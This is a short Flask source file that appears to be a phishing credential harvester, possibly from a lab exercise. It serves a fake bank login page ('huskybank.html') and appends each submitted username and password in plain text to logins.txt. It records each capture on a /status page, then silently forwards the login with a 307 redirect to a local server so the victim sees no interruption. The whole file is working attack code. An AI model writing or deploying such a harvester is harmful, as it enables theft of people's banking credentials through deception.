from flask import Flask, render_template, redirect, url_for, request
import json
from datetime import datetime
app = Flask(__name__)
@app.route("/", methods = ['POST', 'GET'])
def simplepage():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        with open("logins.txt", "a") as file:
            file.write(username + "," + password + "\n")
        with open("templates/status.html", "a") as file:
            file.write("<p>Login info collected on " + str(datetime.now()) + "\n</p>")
        url = "http://127.0.0.1:2222/"
        payload = {"username": username, "password": password, "submit": "Sign In"}
        payloadjson = json.dumps(payload)
        return redirect(url, code=307)
    else:
        return render_template('huskybank.html')
@app.route("/status")
def statuspage():
    return render_template('status.html')